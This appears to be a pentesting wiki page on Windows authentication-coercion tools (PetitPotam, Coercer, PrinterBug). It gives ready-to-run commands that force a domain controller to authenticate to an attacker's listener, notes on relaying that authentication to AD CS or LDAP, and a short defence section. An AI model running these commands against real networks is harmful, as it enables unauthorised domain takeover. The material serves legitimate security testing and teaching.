# Coercion Tools (PetitPotam, Coercer, PrinterBug)

> Techniques and tooling for *coercing* a Windows host — usually a Domain
> Controller — into authenticating to a machine of your choosing. On their own
> they do nothing; their value is as the trigger for an NTLM relay: force the
> DC to authenticate, then relay that authentication somewhere useful.

- **Type:** open source
- **Platform:** cross-platform (Python clients; run from Linux/Kali)

## Description

Several Windows RPC interfaces expose methods that take a UNC path and make the
server connect to it — with the machine account's credentials. An unauthenticated
or low-privileged attacker who can reach those interfaces can therefore point a
DC at their own host and capture (and relay) its `MACHINE$` authentication.
These are *coercion* primitives: they don't grant access by themselves. Paired
with a relay target that a machine account can act on (AD CS web enrolment,
LDAP for RBCD, another host), they turn "I can reach the RPC endpoint" into
domain-relevant access. Coercion is the trigger; the relay does the work — see
[ntlmrelayx](impacket.md) and [mitm6](mitm6.md).

## PetitPotam (MS-EFSRPC)

Abuses the Encrypting File System Remote protocol (`EfsRpcOpenFileRaw` and
friends) to coerce authentication — famously reachable pre-auth on unpatched
hosts, which made it a headline relay-to-AD CS trigger.

- **Link:** https://github.com/topotam/PetitPotam

```bash
# Coerce the DC (target) to authenticate to your listener host
python3 PetitPotam.py <listener_ip> <dc_ip>

# Try unauthenticated first; supply creds if the endpoint requires them
python3 PetitPotam.py -u user -p 'Passw0rd!' -d corp.local <listener_ip> <dc_ip>
```

## Coercer (many methods at once)

A framework that automates coercion across *many* RPC methods and interfaces
(MS-EFSRPC, MS-RPRN, MS-DFSNM, MS-FSRVP, and more), so you don't have to try
each tool by hand.

- **Link:** https://github.com/p0dalirius/Coercer

```bash
# Enumerate which coercion methods a target is vulnerable to (safe recon)
coercer scan -t <dc_ip> -u user -p 'Passw0rd!' -d corp.local

# Fire all available methods to coerce auth back to your listener
coercer coerce -t <dc_ip> -l <listener_ip> -u user -p 'Passw0rd!' -d corp.local
```

## PrinterBug / MS-RPRN (Print Spooler)

Uses the Print System Remote Protocol `RpcRemoteFindFirstPrinterChangeNotification`
to make a host with the Spooler service running connect back to you. The Python
client is `dementor.py` / `printerbug.py`; the technique is also built into
Impacket examples.

- **Link:** https://github.com/dirkjanm/krbrelayx (`printerbug.py`)

```bash
# Coerce a spooler-enabled host to authenticate to the listener
python3 printerbug.py corp.local/user:'Passw0rd!'@<dc_ip> <listener_ip>

# Check whether the Spooler service is reachable first (NetExec)
nxc smb <dc_ip> -u user -p 'Passw0rd!' -M spooler
```

## Notes & references

- These are relay *triggers*. Point the coerced auth at a viable target with
  [ntlmrelayx](impacket.md) (e.g. `-t http://ca01/certsrv/certfnsh.asp` for
  AD CS ESC8, or `-t ldaps://dc01 --delegate-access` for RBCD).
- Coercion yields the **machine account** (`HOST$`), not a user — plan the relay
  target around what a computer account can do.
- Defence: patch (PetitPotam mitigations, MS-RPRN hardening), disable the Print
  Spooler where it isn't needed, enforce SMB/LDAP signing and EPA/channel
  binding, and restrict RPC exposure. See Microsoft ADV210003 for PetitPotam.
- Pairs with [mitm6](mitm6.md) and [Responder](responder.md) as alternative
  sources of relayable authentication.
- Background — coercion + relay to AD CS: https://posts.specterops.io/certified-pre-owned-d95910965cd2